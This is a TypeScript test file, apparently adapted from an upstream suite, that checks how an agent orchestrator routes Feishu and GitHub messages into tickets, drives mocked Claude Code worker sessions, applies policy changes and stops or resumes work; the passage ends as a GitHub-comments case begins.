/**
 * Upstream's tests/runtime.spec.ts from its first line up to its first case after line 900, on the stand-in Claude Code
 * (tests/fixtures/claude.ts). The test plays the model: a worker's turn runs from its Assignment until the case ends it.
 *
 * Every case of that part is here. Left out, as they test DSH-only mechanics:
 * - upstream's afterEach check that nothing used DSH's user RPC (`sessionController.prompt`): the host here only pushes
 *   messages into a query's prompt stream.
 */
import { existsSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterEach, beforeEach, expect, expectTypeOf, it, vi } from 'vitest'
import { TextCache } from '../src/app/cache.ts'
import { Runtime } from '../src/app/runtime.ts'
import { policyHistory } from '../src/app/settings-history.ts'
import { Store } from '../src/app/store.ts'
import { evalsHealth, overview } from '../src/app/views/overview.ts'
import { preview, readable } from '../src/app/views/text.ts'
import { decisionList, search, threadDetail, threadList } from '../src/app/views/threads.ts'
import { executorLoad, ticketDetail, ticketList } from '../src/app/views/tickets.ts'
import { UserError, key, said, threadKey, waitsForPerson, type Trigger } from '../src/core/index.ts'
import type { Machine } from '../src/deployment.ts'
import { mandateInstructions, workerSessionId } from '../src/executor/common.ts'
import { Commands } from '../src/infra/commands.ts'
import { SettingsSchema, policyVersion, type SettingsOrigin } from '../src/policy.ts'
import { feishuSource } from '../src/sources/feishu.ts'
import { githubKind, githubSource, pollRound } from '../src/sources/github.ts'
import { observePull, pullOf } from '../src/sources/github-pull.ts'
import { commentTrigger } from '../src/sources/github-trigger.ts'
import type { SourcePlugin } from '../src/sources/kind.ts'
import { waitUntil } from './fixtures/async.ts'
import { testMachine } from './fixtures/deployment.ts'
import { CHAT, MEMBER, feishu, startRuntime, type Host } from './fixtures/host.ts'

let h: Host
/** The Runtime the case runs: the fixture's, or the one the last `restart` started. */
let runtime: Runtime
/** Answers of commands that differ from the fixture's, by argv; an Error makes the command fail with its message. */
let answers: Record<string, string | Error>
const AGENT = () => join(h.directory, 'agent-gh')
const OTHER = () => join(h.directory, 'other-gh')
const BOT = () => join(h.directory, 'lark-bot')
const HELPERS = 'git config -z --show-origin --get-all credential.https://github.com.helper'
const worktreeName = 'fix-regression'
const quietly = (kind: SourcePlugin['kind']): SourcePlugin => ({ kind, run: async () => {} })
/** The fixture's Sources: GitHub and Feishu without their loops, and the terminal. */
const withSources = (local: SourcePlugin): SourcePlugin[] => [quietly(githubSource.kind), quietly(feishuSource.kind), local]
/** Only the terminal's Source, as upstream's restarted Runtime had no Source kind until a case registered one. */
const noSources = (local: SourcePlugin): SourcePlugin[] => [local]
const settle = async (target = runtime) => { await target.idle(); await new Promise(resolve => setImmediate(resolve)) }

/** Source account overrides for a restart; `feishu: null` disables the Feishu source. */
interface Accounts { github?: Record<string, unknown>; feishu?: Record<string, unknown> | null }
function seed(store: Store, accounts: Accounts = {}): void {
  const settings = store.settings()
  const { feishu: _feishu, ...others } = settings.sources
  const feishu = accounts.feishu === null ? undefined : { ...settings.sources.feishu?.config, cli: BOT(), ...accounts.feishu }
  store.saveSettings(SettingsSchema.parse({ ...settings, sources: { ...others, github: { enabled: true, config: { repository: 'acme/widgets', cli: AGENT(), ...accounts.github } },
    ...feishu ? { feishu: { enabled: true, config: feishu } } : {} } }))
}
/** Stop the Runtime and start another on the same state directory and stand-in Claude Code, as a process restart does. */
async function restart(machine: Partial<Machine> = {}, accounts: Accounts = {}, plugins = withSources): Promise<Runtime> {
  await runtime.stop()
  const store = new Store(join(h.directory, 'orchestrator.sqlite')); seed(store, accounts); store.close()
  runtime = new Runtime(testMachine({ stateDir: h.directory, claudeConfigDir: join(h.directory, 'claude'), ...machine }),
    { logger: h.logger, restart: h.restart, subprocess: h.subprocess, sdk: h.claude.sdk, listen: false, plugins })
  await runtime.start()
  return runtime
}

/** What the host pushed to a Session, parsed; notices that start no turn are left out, as upstream injected them apart. */
const relays = (sessionId: string) => h.claude.to(sessionId).filter(message => message.delivery !== 'inject').map(message => {
  try { return JSON.parse(message.text) as Record<string, unknown> } catch { return { text: message.text } as Record<string, unknown> }
})
/** The notices the host injected into the router's history: upstream's `agent.inject` calls on the main Session. */
const injected = () => h.claude.to(runtime.masterId).filter(message => message.delivery === 'inject')
/** Run a tool of the router (`ticketId` undefined) or of a ticket's worker, as upstream ran a Session's registered tool. */
const runTool = async (ticketId: string | undefined, name: string, args: unknown) => {
  const ticket = ticketId === undefined ? undefined : runtime.store.tickets.get(ticketId)
  const tool = runtime.toolsOf(ticket).find(item => item.name === name)
  if (!tool) throw new Error(`Tool ${name} is not registered for ${ticketId ?? 'the router'}`)
  const output = await tool.execute(tool.schema.parse(args), new AbortController().signal)
  expect(JSON.parse(JSON.stringify(output))).toStrictEqual(output)
  await settle()
  return output as Record<string, unknown>
}
function subscribe(ticketId: string, ref: { source: string; id: string }): void {
  const name = threadKey(ref)
  const thread = runtime.store.threads.get(name) ?? { key: name, ref, createdAt: '', subscriptions: [], correlated: [], pending: [], meta: {} }
  runtime.store.threads.save({ ...thread, subscriptions: [...new Set([...thread.subscriptions, ticketId])] })
}
async function receive(trigger: Trigger, target = runtime) {
  const result = target.receive(trigger)
  await settle(target)
  return result
}
/** Route one decision with the router's orchestrator_route, answering its result; a refused one throws its reason. */
async function route(item: Record<string, unknown>): Promise<Record<string, unknown>> {
  const { results } = await runTool(undefined, 'orchestrator_route', { decisions: [item] }) as { results: Record<string, unknown>[] }
  if (results[0]!.refused) throw new Error(String(results[0]!.refused))
  return results[0]!
}
async function acceptedTicket(trigger = feishu('1', '@bot 修一下回归')) {
  await receive(trigger)
  expect(relays(runtime.masterId).some(item => item.trigger_id === trigger.id)).toBe(true)
  const result = await route({ kind: 'accept', trigger_id: trigger.id, title: '修复回归', worktree_name: worktreeName, acknowledgement: '收到，修复回归。' })
  const ticket = runtime.store.tickets.get((result.ticket as { ticket_id: string }).ticket_id)!
  return { trigger, ticket, sessionId: workerSessionId(ticket.id) }
}
/** A request to the management API, as the panel makes it. */
async function api(method: string, path: string, json?: unknown) {
  let status = 0, text = ''
  const chunks = json === undefined ? [] : [Buffer.from(JSON.stringify(json))]
  const req = { method, url: `/orchestrator/api/${path}`, headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }, async *[Symbol.asyncIterator]() { yield* chunks } }
  await runtime.handle(req as never, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data }, headersSent: false } as never)
  return { status, body: JSON.parse(text) as Record<string, unknown> }
}
const viewsOf = (value: Runtime) => ({ store: value.store, sources: value.sources, links: value.links() })
const overviewOf = (value: Runtime) => overview(viewsOf(value), value.health, policyVersion(value.store.settings()),
  executorLoad(value.store, value.executor.activeCount()), value.setupProblem ?? value.feishuProblem)
/** The options the latest query of a Session started with. */
const started = (sessionId: string): Record<string, any> => h.claude.queries.filter(query => query.session.id === sessionId).at(-1)!.options
/** The system prompt a Session's latest query started with: the router's whole, a worker's appended to Claude Code's. */
const promptOf = (sessionId: string): string => { const prompt = started(sessionId).systemPrompt; return typeof prompt === 'string' ? prompt : prompt.append }
/** What the worker's PreToolUse hook answers for a tool call: undefined when it lets it run, else why it is denied. */
async function guard(sessionId: string, call: { name: string; arguments: unknown } = { name: 'Read', arguments: { file_path: 'README.md' } }) {
  const hook = started(sessionId).hooks.PreToolUse[0].hooks[0] as (input: unknown, id: string | undefined, options: { signal: AbortSignal }) => Promise<Record<string, any>>
  const output = await hook({ hook_event_name: 'PreToolUse', session_id: sessionId, transcript_path: '', cwd: '', tool_name: call.name, tool_input: call.arguments,
    tool_use_id: 'tool-1' }, 'tool-1', { signal: new AbortController().signal })
  return output.hookSpecificOutput?.permissionDecisionReason as string | undefined
}
/** How often the worker's turns were cut short, over all its queries: upstream's `agent.cancel` calls. */
const interrupts = (sessionId: string) => h.claude.queries.filter(query => query.session.id === sessionId).reduce((count, query) => count + query.interrupt.mock.calls.length, 0)
/** The test plays the worker's model to the end of its work: its turn ends, and each one a queued message starts. */
async function endTurns(sessionId: string): Promise<void> {
  const session = h.claude.session(sessionId)
  for (let turns = 0; session.status === 'running'; turns++) {
    if (turns === 10) throw new Error(`The Session ${sessionId} keeps running`)
    session.end(); await settle()
  }
}

beforeEach(async () => {
  h = await startRuntime()
  runtime = h.runtime
  writeFileSync(OTHER(), '#!/bin/sh\n', { mode: 0o755 })
  answers = {
    [`${OTHER()} api user`]: '{"login":"agent-bot","id":7}',
    [`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`]: '{"name":"acme/widgets","push":true}\n',
  }
  const fixture = h.subprocess.run.getMockImplementation()!
  h.subprocess.run.mockImplementation(async (command: string[]) => {
    const argv = [...command]
    while (argv[0] === 'env' || /^[A-Z_]+=/.test(argv[0] ?? '')) argv.shift()
    const answer = answers[argv.join(' ')]
    if (answer === undefined) return fixture(command)
    return answer instanceof Error ? { exitCode: 1, stdout: '', stderr: answer.message } : { exitCode: 0, stdout: answer, stderr: '' }
  })
  // As upstream's beforeEach: a PR is open, by the agent, from the branch of the first ticket.
  vi.mocked(Commands.prototype.gh).mockImplementation(async args => args[1] === 'user' ? { login: 'agent-bot' } : args[1]?.includes('/pulls/')
    ? { state: 'open', user: { login: 'agent-bot' }, html_url: 'https://github.com/acme/widgets/pull/' + args[1].split('/').at(-1),
      head: { ref: `agent/${String(runtime.store.tickets.list()[0]?.execution?.name)}`, sha: 'head-1', repo: { full_name: 'acme/widgets' } } }
    : { default_branch: 'master', permissions: { push: true } })
})
afterEach(async () => { await runtime.stop(); await h.stop() })

it('relays an explicit member mention as a candidate and creates the ticket, acknowledgement, subscription and worker on accept', async () => {
  const { trigger, ticket, sessionId } = await acceptedTicket()
  const candidate = relays(runtime.masterId).find(item => item.kind === 'candidate')!
  expect(candidate).toMatchObject({ strength: 'explicit', trigger_id: trigger.id, next_action: 'Route it with orchestrator_route as dispatch says: accept, attach, stop or ignore.' })
  expect(ticket).toMatchObject({ title: '修复回归', mandate: { strength: 'explicit', basis: expect.objectContaining({ via: 'addressed', source: 'feishu', sender: 'Alice', addressed: 'mention', scope: expect.objectContaining({ chatId: CHAT }) }) },
    execution: expect.objectContaining({ name: expect.stringMatching(/^fix-regression-/) }), origin: expect.objectContaining({ triggerId: trigger.id }) })
  expect(ticket).not.toHaveProperty('ended')
  // The ticket's execution environment is fixed at accept time: its directory under the execution root, and the Sources' values from its Trigger.
  expect(ticket.execution!.directory).toBe(join(h.directory, 'work', ticket.execution!.name))
  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ DSH_SUPERAGENT_DIR: ticket.execution!.directory, DSH_SUPERAGENT_NAME: ticket.execution!.name, DSH_SUPERAGENT_TICKET: ticket.id, DSH_SUPERAGENT_FEISHU_CHAT: CHAT, DSH_SUPERAGENT_GITHUB_REPOSITORY: 'acme/widgets', DSH_SUPERAGENT_GITHUB_ACCOUNT: 'agent-bot', DSH_SUPERAGENT_GITHUB_NUMBER: '' })
  // Adapted: a worker hands a command its free text in a file it writes beside its checkout, never in it.
  expect(runtime.ticketEnvironment(ticket).find(variable => variable.key === 'DSH_SUPERAGENT_DRAFTS')?.value).toBe(join(h.directory, 'work', '.drafts', ticket.execution!.name))
  expect(existsSync(join(h.directory, 'work', '.drafts', ticket.execution!.name))).toBe(true)
  expect(ticket.assignments).toEqual([expect.objectContaining({ state: 'running', startedAt: expect.any(String) })])
  // Adapted: the worker's Session id is the stable UUID Claude Code requires, where upstream named it `worker-<ticket id>`.
  expect(runtime.sessions.worker(ticket.id)?.id).toBe(sessionId)
  expect(runtime.store.threads.get(`feishu:${CHAT}:om_1`)?.subscriptions).toEqual([ticket.id])
  expect(runtime.store.replyStatus(key('ack', trigger.id))).toBe('sent')
  const larkCalls = vi.mocked(Commands.prototype.lark).mock.calls.map(([args]) => args)
  expect(larkCalls.find(args => args[1] === '+messages-reply')).toEqual(expect.arrayContaining(['--message-id', 'om_1', '--markdown', '收到，修复回归。']))
  // The first message holds the request itself: an explicit ticket has no assignment text beyond it, and nothing to read first.
  const first = relays(sessionId)[0]!
  expect(first).toEqual({ ticket_id: ticket.id, title: '修复回归', trigger: expect.objectContaining({ trigger_id: trigger.id, from: MEMBER,
    thread: `feishu:${CHAT}:om_1`, text: trigger.text }) })
  expect(first.trigger).not.toHaveProperty('read')
  expect(await route({ kind: 'accept', trigger_id: trigger.id, title: 'again', worktree_name: worktreeName, acknowledgement: 'x' })).toMatchObject({ ticket: { ticket_id: ticket.id } })
})

// Adapted: the follow-up comes from Alice, as one from 'ou_guest' reaches the ticket only as context (Policy.owns, docs/design.md).
it('fans a person\'s later thread message out to the live worker as context and tells the orchestrator, without an Eval', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  h.claude.pushed.mockClear()
  const followup = feishu('2', '顺便看看日志', { mentions: [], root_id: 'om_1' })
  await receive(followup)
  const worker = relays(sessionId)
  expect(worker).toHaveLength(1)
  expect(worker[0]).toMatchObject({ trigger_id: followup.id, from: MEMBER, text: '顺便看看日志' })
  expect(worker[0]).not.toHaveProperty('read')
  // Its resource renders the same, from the ticket; no body of it is stored.
  const resource = `ticket/${ticket.id}/input/${key(runtime.store.tickets.get(ticket.id)!.inputs[0]!.id)}`
  expect(JSON.parse(((await runTool(ticket.id, 'orchestrator_read', { resource })) as { text: string }).text)).toEqual(worker[0])
  expect(runtime.store.get(resource)).toBeUndefined()
  expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([expect.objectContaining({ kind: 'trigger', triggerId: followup.id })])
  expect(relays(runtime.masterId)).toEqual([{ kind: 'follow_up', trigger_id: followup.id, from: MEMBER, thread: `feishu:${CHAT}:om_1`,
    at: followup.at, text: '顺便看看日志', delivered_to: [{ ticket_id: ticket.id, title: '修复回归', state: 'working' }],
      note: expect.stringContaining('worker has it and decides') }])
  expect(runtime.store.decisions.byThread(`feishu:${CHAT}:om_1`).map(decision => decision.triggerIds)).toEqual([[ticket.origin.triggerId]])
  expect(await runTool(ticket.id, 'orchestrator_read', { resource: `trigger/${followup.id}` }))
    .toMatchObject({ trigger_id: followup.id, around: { before: expect.objectContaining({ read: `trigger/${key('feishu', 'om_1')}` }) } })
})

it('assesses a proactive observation in the orchestrator Session and creates the ticket only on a positive auto-mode decision', async () => {
  const observe = (mode: 'observe' | 'auto') => runtime.settings.save('eval', { ...runtime.store.settings().eval, mode }, runtime.store.blockRevision('eval'), 'panel')
  await observe('observe')
  const trigger = feishu('3', '这个文案好奇怪，改成“浏览网页”吧', { mentions: [] })
  await receive(trigger)
  const candidate = relays(runtime.masterId).at(-1)!
  expect(candidate).toMatchObject({ kind: 'candidate', strength: 'inferred', mode: 'observe', next_action: expect.stringContaining('orchestrator_eval') })
  vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({ items: [{ message_id: 'om_3', chat_id: CHAT }] })
  const details = await runTool(undefined, 'orchestrator_eval', { trigger_id: trigger.id })
  // The rules are in the main Session's Policy section; the context names the Policy version it was built from.
  expect(details).not.toHaveProperty('rules')
  expect(details).toMatchObject({ trigger_id: trigger.id, strength: 'inferred', policy_version: policyVersion(runtime.store.settings()), thread: expect.objectContaining({ complete: true, loaded_messages: 0 }) })
  const decision = (id: string) => ({ trigger_id: id, decision: 'accept', title: '文案修订', worktree_name: 'copy-fix', scope: '改副标题', reason: 'explicit copy change', intent_evidence: 'quoted', acknowledgement: '收到，把副标题改成“浏览网页”。',
    rule_assessments: [{ rule_id: 'copy', matched: true, reason: 'copy change' }, { rule_id: 'visual', matched: false, reason: 'not visual' }],
    direction: { implementation_requested: true, target_basis: 'specified', requires_design_decision: false, evidence: 'the message names the replacement' } })
  expect(await runTool(undefined, 'orchestrator_eval_decide', decision(trigger.id))).toMatchObject({ decision: 'ignore', reason: expect.stringContaining('Observe mode') })
  expect(runtime.store.tickets.list()).toEqual([])
  expect(runtime.store.decisions.byThread(`feishu:${CHAT}:om_3`)[0]!.audit).toMatchObject({ would_accept: true, proposal: { title: '文案修订' } })
  await observe('auto')
  const again = feishu('5', '把副标题改成“浏览网页”', { mentions: [] })
  await receive(again)
  await runTool(undefined, 'orchestrator_eval', { trigger_id: again.id })
  const accepted = await runTool(undefined, 'orchestrator_eval_decide', decision(again.id))
  expect(accepted).toMatchObject({ decision: 'accept', ticket: { ticket_id: expect.any(String) } })
  const ticket = runtime.store.tickets.get((accepted.ticket as { ticket_id: string }).ticket_id)!
  expect(ticket.mandate).toMatchObject({ strength: 'inferred', basis: expect.objectContaining({ via: 'admission', rules: ['copy'], observation: { mode: 'auto' } }) })
  expect(runtime.store.replyStatus(key('ack', again.id))).toBeDefined()
  expect(await runTool(ticket.id, 'orchestrator_read', { resource: `ticket/${ticket.id}/assignment` })).toMatchObject({ text: expect.stringContaining('Proactively accepted under copy') })
})

it('accepts silently under a rule that says so, gives the worker the rule procedure, and closes it as dropped when nothing is left for a human', async () => {
  const policy = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...policy, rules: [...policy.rules, { id: 'silent-bugfix', name: '沉默地复现和修复', enabled: true, instruction: 'Reproduce minimally first; accept silently.' }] }, runtime.store.blockRevision('policy'), 'panel')
  await runtime.settings.save('eval', { ...runtime.store.settings().eval, mode: 'auto' }, runtime.store.blockRevision('eval'), 'panel')
  const trigger = feishu('20', '切换主题后刷新，图标颜色不对', { mentions: [] })
  await receive(trigger)
  vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({ items: [{ message_id: 'om_20', chat_id: CHAT }] })
  await runTool(undefined, 'orchestrator_eval', { trigger_id: trigger.id })
  const accepted = await runTool(undefined, 'orchestrator_eval_decide', { trigger_id: trigger.id, decision: 'accept', title: '主题图标颜色', worktree_name: 'theme-icon-color', scope: 'bug', reason: 'reported defect', intent_evidence: 'quoted',
    rule_assessments: [{ rule_id: 'copy', matched: false, reason: 'no' }, { rule_id: 'visual', matched: false, reason: 'no' }, { rule_id: 'silent-bugfix', matched: true, reason: 'bug report' }],
    direction: { implementation_requested: true, target_basis: 'existing-standard', requires_design_decision: false, evidence: 'expected colour is the light palette' } })
  const ticket = runtime.store.tickets.get((accepted.ticket as { ticket_id: string }).ticket_id)!
  expect(runtime.store.replyStatus(key('ack', trigger.id))).toBeUndefined()
  await settle()
  // Adapted: the worker's prompt is the system prompt its query starts with, where upstream registered a DSH prompt section.
  expect(promptOf(workerSessionId(ticket.id))).toContain(mandateInstructions({ strength: 'inferred' }))
  expect(await runTool(ticket.id, 'orchestrator_read', { resource: `ticket/${ticket.id}/assignment` })).toMatchObject({ text: expect.stringContaining('沉默地复现和修复 (silent-bugfix): Reproduce minimally first; accept silently.') })
  await expect(runTool(undefined, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: 'x' })).rejects.toThrow('not ready')
  await runTool(ticket.id, 'orchestrator_report', { state: 'blocked', summary: 'needs a decision' })
  await expect(runTool(undefined, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: 'x' })).rejects.toThrow('not ready')
  // Nothing left for a human: the ticket closes instead of waiting, and the rule's closing sentence can still be delivered.
  await runTool(ticket.id, 'orchestrator_report', { state: 'dropped', summary: 'too complex; recorded in #123' })
  expect(runtime.store.tickets.get(ticket.id)).toMatchObject({ ended: expect.objectContaining({ by: 'executor', outcome: 'dropped' }) })
  expect(await runTool(undefined, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: '看到这个问题我试了一下，能复现，修复需要较大改动，已记在 #123。' })).toEqual({ status: 'sent' })
})

it('records worker reports, binds the task PR, ends the ticket on ready without a PR, and relays attention', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  h.claude.pushed.mockClear()
  expect(await runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'started' })).toMatchObject({ notification: 'internal_only' })
  expect(relays(runtime.masterId)).toEqual([])
  await runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'need a decision', human_action: 'Desktop too?' })
  expect(runtime.store.tickets.get(ticket.id)!.attention).toMatchObject({ question: 'Desktop too?' })
  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_attention', ticket: { ticket_id: ticket.id, attention: { question: 'Desktop too?' } } })
  await expect(runTool(undefined, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'other', text: 'x' })).rejects.toThrow('current attention question')
  expect(await runTool(undefined, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'Desktop too?', text: '要不要也改桌面端？' })).toEqual({ status: 'sent' })
  await runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'pr open', pr_number: 42, human_action: null })
  const bound = runtime.store.tickets.get(ticket.id)!
  expect(pullOf(bound)).toBe(42)
  expect(bound.attention).toBeUndefined()
  expect(runtime.store.threads.get('github:42')?.subscriptions).toEqual([ticket.id])
  await runTool(ticket.id, 'orchestrator_report', { state: 'ready', summary: 'reviewed' })
  expect(runtime.store.tickets.get(ticket.id)!.ended).toBeUndefined()
  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_report', state: 'ready' })
  expect(await runTool(undefined, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: '已提交 PR #42，待 review。' })).toEqual({ status: 'sent' })
  const mergedAt = new Date().toISOString()
  const merged = { number: 42, state: 'closed', merged: true, merged_at: mergedAt, html_url: 'https://github.com/acme/widgets/pull/42',
    user: { login: 'agent-bot' }, head: { sha: 'abc', ref: 'agent/x', repo: { full_name: 'acme/widgets' } } }
  await observePull(runtime.context(githubKind), merged)
  const ended = runtime.store.tickets.get(ticket.id)!
  expect(ended).toMatchObject({ ended: expect.objectContaining({ by: 'executor', outcome: 'merged' }) })
  // The ended ticket keeps its Subscription to the PR, so a later human comment there resumes it.
  expect(runtime.store.threads.get('github:42')?.subscriptions).toEqual([ticket.id])
  // Its worker's last word was its ready report, so its turn is not cancelled: it ends it itself.
  await settle()
  expect(interrupts(sessionId)).toBe(0)
  const notice = runtime.store.receipts.waiting().find(item => item.kind === 'notice')
  expect(notice ?? runtime.store.replyStatus(key('pr-terminal', '42', 'feishu', JSON.stringify({ chatId: CHAT, messageId: 'om_1' }), 'merged'))).toBeTruthy()
})

it('lists each ticket with the Threads it subscribes to, as their Sources describe them', async () => {
  const { ticket } = await acceptedTicket()
  await runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'pr open', pr_number: 42 })
  const line = () => ticketList(viewsOf(runtime), 'working', 0, 20).items.find(item => item.id === ticket.id)!
  runtime.store.threads.describe('github:42', { label: '#42 Fix the margin', facts: { number: { value: '#42' }, ci: { label: 'CI', value: { zh: '通过', en: 'passed' } } } })
  expect(line()).not.toHaveProperty('prNumber')
  expect(line().threads).toContainEqual(expect.objectContaining({ key: 'github:42', source: 'github', title: '#42 Fix the margin', facts: { number: { value: '#42' }, ci: { label: 'CI', value: { zh: '通过', en: 'passed' } } } }))
  runtime.store.threads.describe('github:42', { facts: { ci: null } })
  expect(line().threads.find(thread => thread.key === 'github:42')!.facts).toEqual({ number: { value: '#42' } })
})

it('shows a message that carries JSON, with or without a label, as its label and values on lines', () => {
  const text = `GitHub PR #7 CI: ${JSON.stringify({ head: 'abc1234', checks: [{ name: 'e2e', status: 'completed', conclusion: 'failure' }, { name: 'lint', status: 'in_progress', conclusion: null }], statuses: [] })}`
  expect(readable(text)).toBe('GitHub PR #7 CI\nhead: abc1234\nchecks:\n- e2e · completed · failure\n- lint · in_progress\nstatuses: ')
  expect(preview(text)).toBe('GitHub PR #7 CI head: abc1234 checks: e2e · completed · failure lint · in_progress statuses:')
  expect(readable('see {this} later')).toBe('see {this} later')
  expect(readable('label: {not json}')).toBe('label: {not json}')
})

it('ends a ticket on ready when no PR is bound', async () => {
  const { ticket } = await acceptedTicket()
  await runTool(ticket.id, 'orchestrator_report', { state: 'ready', summary: 'done locally' })
  expect(runtime.store.tickets.get(ticket.id)).toMatchObject({ ended: expect.objectContaining({ outcome: 'completed' }) })
  await expect(runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'late' })).rejects.toThrow('Ticket ended')
})

// Adapted: a message from 'ou_guest' on the ended ticket's thread now resumes nothing, as it reaches the ticket only as context
// (Policy.owns, docs/design.md); the case asserts that, then that Alice's message on the thread resumes it as upstream's did.
it('stops a ticket on a person\'s instruction for good, and resumes an ended one on any person\'s message on its thread', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const request = feishu('5', '@bot 停下，不用修了', { root_id: 'om_1' })
  await receive(request)
  expect(await route({ kind: 'stop', ticket_id: ticket.id, trigger_id: request.id }))
    .toMatchObject({ decision: 'stop', reason: 'Human asked to stop', ticket: { ticket_id: ticket.id, state: 'stopped' } })
  // The end says it was a person's stop once: no reason that repeats the outcome, none copied onto the Assignment.
  const stopped = runtime.store.tickets.get(ticket.id)!
  expect(stopped.ended).toEqual({ at: expect.any(String), by: 'human', outcome: 'stopped' })
  expect(stopped.assignments[0]).not.toHaveProperty('endedReason')
  // Adapted: upstream cancelled the agent without keeping its inbox; here its turn is cut short and its ledger let go of.
  await waitUntil(() => interrupts(sessionId) === 1)
  expect(runtime.sessions.worker(ticket.id)!.pendingIds()).toEqual([])
  // A stop withdraws the mandate: later messages wait as context, and only new work restarts it.
  const guest = feishu('6', '继续吧', { mentions: [], root_id: 'om_1', sender_id: 'ou_guest' })
  await receive(guest)
  await runtime.pump()
  expect(runtime.store.tickets.get(ticket.id)!.ended).toBeDefined()
  await expect(route({ kind: 'attach', ticket_id: ticket.id, trigger_id: guest.id })).rejects.toThrow('stopped')
  // A ticket that ended by itself resumes on a person's message on its thread: not on a guest's, which is context only.
  const other = await acceptedTicket(feishu('20', '@bot 修另一个'))
  await runTool(other.ticket.id, 'orchestrator_report', { state: 'dropped', summary: 'not reproduced' })
  expect(runtime.store.tickets.get(other.ticket.id)!.ended).toBeDefined()
  await receive(feishu('21', '我这边还能复现', { mentions: [], root_id: 'om_20', sender_id: 'ou_guest' }))
  await runtime.pump()
  expect(runtime.store.tickets.get(other.ticket.id)).toMatchObject({ ended: expect.anything(), assignments: [expect.anything()] })
  await receive(feishu('22', '我这边还能复现', { mentions: [], root_id: 'om_20' }))
  await runtime.pump()
  const resumed = runtime.store.tickets.get(other.ticket.id)!
  expect(resumed.ended).toBeUndefined()
  expect(resumed.assignments).toHaveLength(2)
  expect(resumed.inputs.map(input => input.kind)).toContain('resumed')
})

it('tells live workers about policy changes instead of revoking them and restarts in-flight assessments', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const pending = feishu('8', '新观察', { mentions: [], sender_id: MEMBER, root_id: undefined })
  await receive(pending)
  expect(runtime.store.threads.get(`feishu:${CHAT}:om_8`)?.evaluating).toBeDefined()
  h.claude.pushed.mockClear()
  const settings = runtime.store.settings()
  const result = await runtime.settings.save('policy', { ...settings.policy, rules: settings.policy.rules.map(rule => ({ ...rule, enabled: rule.id === 'copy' })) }, runtime.store.blockRevision('policy'), 'panel')
  await settle()
  expect(result).toMatchObject({ saved: true, policy_changed: true })
  // The rules changed, but not as they bear on this explicit ticket, whose requester is still allowed: its worker is not woken.
  expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([])
  expect(relays(sessionId)).toEqual([])
  // Its requester comes off the allowed list: the worker is told so, inline, and the ticket goes on.
  const current = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...current, sources: { ...current.sources, feishu: { ...current.sources.feishu!, allowed: [] } } },
    runtime.store.blockRevision('policy'), 'panel')
  await settle()
  expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([expect.objectContaining({ kind: 'policy-changed',
    effect: { requesterAllowed: false, requester: { source: 'feishu', id: MEMBER } } })])
  expect(runtime.store.tickets.get(ticket.id)!.ended).toBeUndefined()
  expect(relays(sessionId)).toEqual([{ text: expect.stringContaining('may no longer start work') }])
  expect(runtime.store.decisions.byThread(`feishu:${CHAT}:om_8`)[0]).toMatchObject({ kind: 'unavailable', reason: [{ code: 'policyChanged' }] })
  expect(relays(runtime.masterId).filter(item => item.kind === 'candidate' && item.trigger_id === pending.id)).toHaveLength(1)
})

it('attaches an event to an existing open task through orchestrator_route', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const other = feishu('9', '@bot 顺手把这里也改了', { root_id: undefined })
  await receive(other)
  h.claude.pushed.mockClear()
  expect(await route({ kind: 'attach', ticket_id: ticket.id, trigger_id: other.id, note: '同一个页面' })).toMatchObject({ ticket: { ticket_id: ticket.id } })
  expect(runtime.store.threads.get(`feishu:${CHAT}:om_9`)?.subscriptions).toEqual([ticket.id])
  expect(runtime.store.decisions.byThread(`feishu:${CHAT}:om_9`)).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'routed', values: { ticket: ticket.id } }] })])
  expect(relays(sessionId)[0]).toMatchObject({ trigger_id: other.id, text: '@bot 顺手把这里也改了', routing_note: '同一个页面' })
})

it('acknowledges a follow-up from the worker once and rejects events outside the task', async () => {
  const { ticket } = await acceptedTicket()
  const followup = feishu('10', '还有这个', { mentions: [], root_id: 'om_1' })
  await receive(followup)
  expect(await runTool(ticket.id, 'orchestrator_ack', { trigger_id: followup.id, text: '收到，也处理这个。' })).toMatchObject({ acknowledgement: 'sent', reused: false })
  expect(await runTool(ticket.id, 'orchestrator_ack', { trigger_id: followup.id, text: '不同措辞' })).toMatchObject({ reused: true })
  const stranger = feishu('11', '无关', { mentions: [], root_id: undefined })
  await receive(stranger)
  await expect(runTool(ticket.id, 'orchestrator_ack', { trigger_id: stranger.id, text: 'x' })).rejects.toThrow('does not belong')
  expect(runtime.store.tickets.get(ticket.id)!.inputs.map(input => input.kind)).toEqual(['trigger'])
})

it('treats GitHub comments through the same gate: mentions by members are explicit, others need an existing task', async () => {
